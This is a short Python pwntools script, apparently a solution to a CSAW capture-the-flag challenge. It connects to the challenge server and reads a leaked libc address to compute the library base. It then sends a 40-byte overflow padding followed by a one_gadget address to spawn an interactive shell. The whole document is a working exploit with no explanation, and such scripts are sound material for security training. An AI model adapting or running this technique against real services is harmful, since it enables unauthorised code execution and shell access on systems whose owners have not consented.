from pwn import *

context.arch = 'amd64'
con = remote('pwn.chal.csaw.io', 1005)

con.recvline()
msg = con.recvline().strip()

print msg
libc_base_addr = int(msg[13:], 16) - 0x064e80

print "[+] libc_base_addr = 0x%x" % libc_base_addr

payload = 'A' * 40
payload += pack(libc_base_addr + 0x4f322)
con.sendline(payload)

con.interactive()
